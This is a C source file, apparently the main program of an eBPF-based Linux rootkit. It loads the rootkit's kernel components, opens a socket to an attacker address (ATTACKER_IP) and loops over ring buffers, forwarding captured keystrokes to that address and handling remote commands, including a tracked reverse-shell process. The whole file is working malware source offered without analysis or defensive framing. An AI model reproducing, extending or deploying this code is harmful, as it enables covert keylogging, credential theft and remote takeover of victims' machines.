#include <bpf/libbpf.h>
#include <errno.h>
#include <linux/types.h>
#include <stdio.h>

#include "config.h"
#include "rootkit.skel.h"
#include "userspace/command_processor.h"
#include "userspace/hider.h"
#include "userspace/keylogger_processor.h"
#include "userspace/loader.h"

#define RING_BUFF_POLL_TIMEOUT_MS 100

int main() {
    struct rootkit *skel;

    skel = loader_load_rootkit();
    if (!skel)
        return -EINVAL;

    keylogger_context_t keylog_ctx = {
        .keylogger_socket_fd = keylogger_processor_init_sender_socket(ATTACKER_IP, KEYLOGGER_PORT),
    };

    process_context_t process_ctx = {
        .reverse_shell_pid = -1,
    };

    struct ring_buffer *keylog_event_rb = ring_buffer__new(
        bpf_map__fd(skel->maps.keylog_events), keylogger_processor_process_event, &keylog_ctx, NULL);
    if (!keylog_event_rb) {
        loader_unload_rootkit(skel);
        return -ENOMEM;
    }

    struct ring_buffer *command_event_rb =
        ring_buffer__new(bpf_map__fd(skel->maps.events), command_processor_handle_received_command,
                         &process_ctx, NULL);
    if (!command_event_rb) {
        loader_unload_rootkit(skel);
        return -ENOMEM;
    }

    while (1) {

        if (keylog_ctx.keylogger_socket_fd < 0)
            keylog_ctx.keylogger_socket_fd =
                keylogger_processor_init_sender_socket(ATTACKER_IP, KEYLOGGER_PORT);

        ring_buffer__poll(keylog_event_rb, RING_BUFF_POLL_TIMEOUT_MS);
        ring_buffer__poll(command_event_rb, RING_BUFF_POLL_TIMEOUT_MS);
    }

    loader_unload_rootkit(skel);

    return 0;
}
